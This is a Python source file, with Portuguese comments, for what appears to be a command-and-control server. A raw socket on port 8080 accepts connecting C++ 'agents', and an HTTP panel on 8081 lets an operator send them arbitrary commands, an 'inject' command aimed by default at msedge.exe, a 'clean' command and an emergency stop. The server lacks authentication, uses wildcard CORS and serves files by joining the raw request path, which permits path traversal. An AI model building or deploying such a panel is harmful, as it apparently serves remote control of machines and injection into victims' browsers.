#!/usr/bin/env python3
"""
Remote Control Server
Serve o frontend + API + Socket para agentes
"""

import socket
import threading
import json
import time
import logging
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Caminho do frontend (pasta acima do backend)
FRONTEND_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'frontend')


class AgentManager:
    def __init__(self):
        self.agents = {}
        self.connections = {}  # agent_id -> socket connection
        self.lock = threading.Lock()

    def register(self, agent_id, ip, port, conn):
        with self.lock:
            self.agents[agent_id] = {
                'agent_id': agent_id,
                'ip': ip,
                'port': port,
                'status': 'connected',
                'last_seen': time.time()
            }
            self.connections[agent_id] = conn
            logger.info(f"Agente registrado: {agent_id}")

    def unregister(self, agent_id):
        with self.lock:
            self.agents.pop(agent_id, None)
            self.connections.pop(agent_id, None)
            logger.info(f"Agente desconectado: {agent_id}")

    def get_all(self):
        with self.lock:
            return list(self.agents.values())

    def send_command(self, agent_id, command, params=None):
        with self.lock:
            conn = self.connections.get(agent_id)
        if not conn:
            return {"status": "error", "message": "Agente nao encontrado"}
        try:
            msg = json.dumps({"command": command, "params": params or {}})
            conn.sendall(msg.encode())
            # Espera resposta por 5 segundos
            conn.settimeout(5)
            response = conn.recv(4096).decode()
            conn.settimeout(None)
            return {"status": "ok", "response": response}
        except Exception as e:
            return {"status": "error", "message": str(e)}


agent_manager = AgentManager()


class APIHandler(BaseHTTPRequestHandler):
    def _headers(self, code, content_type='application/json'):
        self.send_response(code)
        self.send_header('Content-Type', content_type)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def _json(self, code, data):
        self._headers(code)
        self.wfile.write(json.dumps(data).encode())

    def do_OPTIONS(self):
        self._headers(200)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        # API endpoints
        if path == '/api/status':
            self._json(200, {"status": "online", "version": "1.0", "agents": len(agent_manager.get_all())})

        elif path == '/api/agents':
            self._json(200, {"agents": agent_manager.get_all()})

        # Servir arquivos do frontend
        elif path == '/' or path == '/index.html':
            self._serve_file('index.html', 'text/html')

        else:
            # Tentar servir arquivo estático
            filename = path.lstrip('/')
            filepath = os.path.join(FRONTEND_DIR, filename)
            if os.path.isfile(filepath):
                ext = os.path.splitext(filename)[1]
                types = {'.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript'}
                self._serve_file(filename, types.get(ext, 'text/plain'))
            else:
                self._json(404, {"error": "Not found"})

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        parsed = urlparse(self.path)
        path = parsed.path

        try:
            data = json.loads(body) if body else {}
        except json.JSONDecodeError:
            self._json(400, {"error": "JSON invalido"})
            return

        if path == '/api/inject':
            agent_id = data.get('agent_id')
            target = data.get('target', 'msedge.exe')
            result = agent_manager.send_command(agent_id, 'inject', {'target': target})
            self._json(200, result)

        elif path == '/api/clean':
            agent_id = data.get('agent_id')
            clean_type = data.get('type', 'all')
            result = agent_manager.send_command(agent_id, 'clean', {'type': clean_type})
            self._json(200, result)

        elif path == '/api/command':
            agent_id = data.get('agent_id')
            command = data.get('command')
            params = data.get('params', {})
            if not agent_id or not command:
                self._json(400, {"error": "agent_id e command sao obrigatorios"})
                return
            result = agent_manager.send_command(agent_id, command, params)
            self._json(200, result)

        elif path == '/api/stop_all':
            for agent in agent_manager.get_all():
                agent_manager.send_command(agent['agent_id'], 'stop', {'emergency': True})
            self._json(200, {"status": "stop_sent_to_all"})

        else:
            self._json(404, {"error": "Endpoint nao encontrado"})

    def _serve_file(self, filename, content_type):
        filepath = os.path.join(FRONTEND_DIR, filename)
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            self._headers(200, content_type)
            self.wfile.write(content)
        except FileNotFoundError:
            self._json(404, {"error": f"Arquivo {filename} nao encontrado"})

    def log_message(self, format, *args):
        # Silencia logs de request HTTP (muito verboso)
        pass


class SocketServer(threading.Thread):
    def __init__(self, host='0.0.0.0', port=8080):
        super().__init__(daemon=True)
        self.host = host
        self.port = port

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.host, self.port))
        srv.listen(10)
        logger.info(f"Socket server aguardando agentes em {self.host}:{self.port}")

        while True:
            try:
                conn, addr = srv.accept()
                t = threading.Thread(target=self.handle, args=(conn, addr), daemon=True)
                t.start()
            except Exception as e:
                logger.error(f"Erro no socket server: {e}")

    def handle(self, conn, addr):
        agent_id = None
        try:
            data = conn.recv(1024).decode().strip()
            if data == "AGENT_CONNECTED":
                agent_id = f"agent_{addr[0]}_{addr[1]}"
                agent_manager.register(agent_id, addr[0], addr[1], conn)

                welcome = json.dumps({
                    'status': 'connected',
                    'agent_id': agent_id,
                    'commands': ['ping', 'inject', 'clean', 'status', 'stop']
                })
                conn.sendall(welcome.encode())

                # Mantem conexao viva
                while True:
                    raw = conn.recv(4096)
                    if not raw:
                        break
                    logger.info(f"[{agent_id}] resposta: {raw.decode()}")

        except Exception as e:
            logger.error(f"Erro no agente {agent_id}: {e}")
        finally:
            if agent_id:
                agent_manager.unregister(agent_id)
            conn.close()


def main():
    print()
    print("  ================================")
    print("   Remote Control Panel - Server")
    print("  ================================")
    print()

    # Inicia socket server para agentes
    sock_srv = SocketServer()
    sock_srv.start()

    # Inicia HTTP server (API + frontend)
    http_srv = HTTPServer(('0.0.0.0', 8081), APIHandler)

    print("  [OK] Socket server:  porta 8080  (agentes C++)")
    print("  [OK] HTTP server:    porta 8081  (interface web)")
    print()
    print("  Abra no navegador: http://localhost:8081")
    print()
    print("  CTRL+C para parar")
    print()

    try:
        http_srv.serve_forever()
    except KeyboardInterrupt:
        print("\n  Servidor parado.")


if __name__ == '__main__':
    main()
